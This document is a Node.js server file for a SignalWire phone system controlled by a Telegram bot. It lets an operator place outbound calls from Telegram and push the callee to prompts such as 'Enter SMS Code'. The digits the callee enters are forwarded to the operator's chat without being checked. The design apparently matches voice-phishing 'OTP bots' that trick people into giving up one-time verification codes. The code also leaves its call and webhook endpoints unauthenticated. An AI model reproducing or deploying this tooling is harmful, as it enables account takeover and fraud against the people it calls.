/**
 * SignalWire + Telegram IVR (full, Twilio-style)
 * See README and .env.example for details.
 */
const express = require('express');
const bodyParser = require('body-parser');
const got = require('got');
const { RestClient } = require('@signalwire/node');

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

const SW_PROJECT = process.env.SW_PROJECT;
const SW_TOKEN   = process.env.SW_TOKEN;
const SW_SPACE   = process.env.SW_SPACE;
const SW_FROM    = process.env.SW_FROM;
const BASE       = process.env.PUBLIC_BASE_URL;
const MUSIC_URL  = process.env.MUSIC_URL || "https://cdn.signalwire.com/default-music/waiting.mp3";
const AGENT_NUM  = process.env.AGENT_NUMBER || "";

const sw = new RestClient(SW_PROJECT, SW_TOKEN, { signalwireSpaceUrl: SW_SPACE });

const TG_TOKEN = process.env.TG_TOKEN;
const TG_CHAT  = process.env.TG_CHAT;
const TG_API   = TG_TOKEN ? `https://api.telegram.org/bot${TG_TOKEN}` : null;

async function tgSend(text, buttons) {
  if (!TG_API || !TG_CHAT) return;
  try {
    await got.post(`${TG_API}/sendMessage`, {
      json: { chat_id: TG_CHAT, text, parse_mode: "HTML", reply_markup: buttons || undefined }
    });
  } catch (e) { console.log("Telegram send error:", e.message); }
}

function buttonsForCall(sid){
  return {
    inline_keyboard: [
      [{text:"▶️ Club Message",    callback_data:`ctl:msg:club:${sid}`}],
      [{text:"▶️ Company Message", callback_data:`ctl:msg:company:${sid}`}],
      [{text:"🙏 Thanks",          callback_data:`ctl:msg:thanks:${sid}`}],
      [{text:"🔁 Hold / Music",    callback_data:`ctl:hold::${sid}`}],
      [{text:"📞 Transfer Agent",  callback_data:`ctl:transfer::${sid}`}],
      [{text:"⛔ End Call",        callback_data:`ctl:end::${sid}`}],
      [{text:"1️⃣ Enter SMS Code", callback_data:`ctl:collect:otp:${sid}`}],
      [{text:"2️⃣ Enter Company ID", callback_data:`ctl:collect:company_id:${sid}`}],
      [{text:"3️⃣ Enter Order #",  callback_data:`ctl:collect:order_id:${sid}`}],
      [{text:"4️⃣ Enter Ticket #", callback_data:`ctl:collect:ticket_no:${sid}`}],
    ]
  };
}

function msgText(key){
  const map = {
    club:   "This is the club message. Welcome and have a great day.",
    company:"This is the company message. We appreciate your call.",
    thanks: "Thanks for calling. Goodbye."
  };
  return map[key] || "Default message.";
}

async function updateCallUrl(callSid, urlPath){
  try {
    if (sw.calls && typeof sw.calls.update === 'function') {
      await sw.calls.update(callSid, { url: `${BASE}${urlPath}`, method: 'POST' });
      return;
    }
  } catch(e) {}
  await sw.calls(callSid).update({ url: `${BASE}${urlPath}`, method: 'POST' });
}

app.get('/', (_req,res)=> res.send('✅ SignalWire + Telegram IVR is up'));

app.post('/sw/incoming', async (req,res)=>{
  const from = req.body.From || '-';
  const sid  = req.body.CallSid || '-';
  await tgSend(`📞 Incoming: <b>${from}</b>\nCallSid: <code>${sid}</code>`, buttonsForCall(sid));
  const xml = `<?xml version="1.0" encoding="UTF-8"?><Response>
    <Say voice="woman">Welcome to your I.V.R.</Say>
    <Gather action="/sw/gather" method="POST" numDigits="1" timeout="6">
      <Say>Press 1 for club message. Press 2 for company message. Press 3 to talk to an agent. Press 9 to end.</Say>
      <Play>${MUSIC_URL}</Play>
    </Gather>
    <Redirect method="POST">/sw/hold</Redirect>
  </Response>`;
  res.type('text/xml').send(xml);
});

app.post('/sw/gather', async (req,res)=>{
  const digits = (req.body.Digits || '').trim();
  const sid    = req.body.CallSid || '-';
  await tgSend(`👆 DTMF: <b>${digits || '(none)'}</b>\nCallSid: <code>${sid}</code>`);
  let path = '/sw/hold';
  if (digits === '1') path = '/sw/msg?key=club';
  else if (digits === '2') path = '/sw/msg?key=company';
  else if (digits === '3') path = '/sw/transfer';
  else if (digits === '9') path = '/sw/hangup';
  const xml = `<?xml version="1.0" encoding="UTF-8"?><Response><Redirect method="POST">${path}</Redirect></Response>`;
  res.type('text/xml').send(xml);
});

app.post('/sw/hold', (_req,res)=>{
  const xml = `<?xml version="1.0" encoding="UTF-8"?><Response>
    <Play loop="1">${MUSIC_URL}</Play>
    <Redirect method="POST">/sw/hold</Redirect>
  </Response>`;
  res.type('text/xml').send(xml);
});

app.post('/sw/msg', (req,res)=>{
  const key = (req.query.key || 'company').toString();
  const say = msgText(key);
  const xml = `<?xml version="1.0" encoding="UTF-8"?><Response>
    <Say voice="woman">${say}</Say>
    <Redirect method="POST">/sw/hold</Redirect>
  </Response>`;
  res.type('text/xml').send(xml);
});

app.post('/sw/transfer', (req,res)=>{
  const xml = (AGENT_NUM && AGENT_NUM.length > 0)
    ? `<?xml version="1.0" encoding="UTF-8"?><Response><Say voice="woman">Transferring you to an agent.</Say><Dial>${AGENT_NUM}</Dial></Response>`
    : `<?xml version="1.0" encoding="UTF-8"?><Response><Say voice="woman">No agent number configured. Ending the call.</Say><Hangup/></Response>`;
  res.type('text/xml').send(xml);
});

app.post('/sw/hangup', (_req,res)=>{
  const xml = `<?xml version="1.0" encoding="UTF-8"?><Response><Say voice="woman">Goodbye.</Say><Hangup/></Response>`;
  res.type('text/xml').send(xml);
});

app.post('/sw/collect', (req,res)=>{
  const field = (req.query.field || 'value').toString();
  const prompt = `Please enter your ${field.replace('_',' ')} followed by the pound key.`;
  const xml = `<?xml version="1.0" encoding="UTF-8"?><Response>
    <Gather action="/sw/collect-done?field=${encodeURIComponent(field)}" method="POST" finishOnKey="#" timeout="8">
      <Say voice="woman">${prompt}</Say>
      <Play>${MUSIC_URL}</Play>
    </Gather>
    <Redirect method="POST">/sw/hold</Redirect>
  </Response>`;
  res.type('text/xml').send(xml);
});

app.post('/sw/collect-done', async (req,res)=>{
  const field = (req.query.field || 'value').toString();
  const digits = (req.body.Digits || '').trim();
  const sid = req.body.CallSid || '-';
  await tgSend(`🧾 Collected <b>${field}</b>: <code>${digits}</code>\nCallSid: <code>${sid}</code>`);
  const xml = `<?xml version="1.0" encoding="UTF-8"?><Response><Say voice="woman">Thank you.</Say><Redirect method="POST">/sw/hold</Redirect></Response>`;
  res.type('text/xml').send(xml);
});

app.post('/sw/status', async (req,res)=>{
  const status = req.body.CallStatus || 'unknown';
  const sid    = req.body.CallSid || '-';
  const to     = req.body.To || '-';
  const from   = req.body.From || '-';
  const dur    = req.body.CallDuration;
  let txt = `📞 <b>Call update</b>\nStatus: <b>${status}</b>\nTo: ${to}\nFrom: ${from}\nCallSid: <code>${sid}</code>`;
  if (status === 'completed' && dur) txt += `\n⏱️ Duration: <b>${dur} seconds</b>`;
  await tgSend(txt);
  res.json({ ok:true });
});

app.post('/call', async (req,res)=>{
  try {
    const to = String(req.body.to || '').trim();
    if (!to) return res.status(400).json({ ok:false, error:"missing 'to'" });
    if (!SW_FROM) return res.status(400).json({ ok:false, error:"missing SW_FROM" });
    if (!BASE)    return res.status(400).json({ ok:false, error:"missing PUBLIC_BASE_URL" });

    const call = await sw.calls.create({
      from: SW_FROM,
      to,
      url: `${BASE}/sw/incoming`,
      statusCallback: `${BASE}/sw/status`,
      statusCallbackEvent: ['initiated','ringing','answered','completed','busy','failed','no-answer'],
      statusCallbackMethod: 'POST'
    });
    await tgSend(`📲 Outbound started to <b>${to}</b>\nCallSid: <code>${call.sid}</code>`, buttonsForCall(call.sid));
    res.json({ ok:true, sid: call.sid });
  } catch(e){
    console.log("Outbound error:", e.message);
    await tgSend(`⚠️ Outbound failed: <code>${e.message||e}</code>`);
    res.status(500).json({ ok:false, error: e.message||String(e) });
  }
});

app.post('/tg/webhook', async (req,res)=>{
  const body = typeof req.body === 'object' ? req.body : {};
  try {
    if (body.message && body.message.text) {
      const chat = body.message.chat.id;
      const txt = String(body.message.text||'').trim();
      const m = txt.match(/^\/call\s+(\+?\d{6,20})$/);
      if (m) {
        const to = m[1];
        const resp = await got.post(`${BASE}/call`, { json: { to } }).json();
        await got.post(`${TG_API}/sendMessage`, { json: { chat_id: chat, text: `Triggered outbound to ${to}\nResponse: ${JSON.stringify(resp)}` } });
      } else {
        await got.post(`${TG_API}/sendMessage`, { json: { chat_id: chat, text: 'Use: /call +2010XXXXXXX' } });
      }
      return res.json({ ok:true });
    }
    if (body.callback_query) {
      const chat = body.callback_query.message.chat.id;
      const data = String(body.callback_query.data||"");
      const [pfx, action, arg, sid] = data.split(":");
      if (pfx !== 'ctl' || !sid) return res.json({ ok:true });
      try {
        if (action === 'msg')       { await updateCallUrl(sid, `/sw/msg?key=${encodeURIComponent(arg)}`); await tgSend(`▶️ Playing: <b>${arg}</b>`); }
        else if (action === 'hold') { await updateCallUrl(sid, `/sw/hold`); await tgSend(`🔁 Hold / Music`); }
        else if (action === 'transfer') { await updateCallUrl(sid, `/sw/transfer`); await tgSend(`📞 Transferring to agent...`); }
        else if (action === 'end')  { await updateCallUrl(sid, `/sw/hangup`); await tgSend(`⛔ Ending call`); }
        else if (action === 'collect') { await updateCallUrl(sid, `/sw/collect?field=${encodeURIComponent(arg||'value')}`); await tgSend(`🔢 Collect started: <b>${arg||'value'}</b>`); }
      } catch(e){ await tgSend(`⚠️ Command failed: ${e.message||e}`); }
      return res.json({ ok:true });
    }
    res.json({ ok:true });
  } catch(e){
    console.log("TG webhook error:", e.message);
    res.json({ ok:false });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, ()=> console.log("IVR server listening on", PORT));
